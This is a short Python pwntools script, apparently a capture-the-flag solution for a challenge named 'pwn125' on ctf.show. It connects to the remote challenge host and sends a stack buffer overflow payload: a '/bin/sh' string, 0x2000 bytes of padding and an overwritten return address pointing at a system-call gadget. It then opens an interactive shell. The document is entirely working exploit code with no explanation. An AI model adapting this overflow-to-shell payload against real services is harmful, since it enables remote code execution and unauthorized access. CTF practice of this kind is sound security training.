from pwn import *
io = remote("pwn.challenge.ctf.show",28264)
# io = process("./pwn125")
call_sys = 0x0000000000400672 
payload =b'/bin/sh\x00' +b'a'*(0x2000) + p64(call_sys) 
io.sendline(payload)
io.interactive()
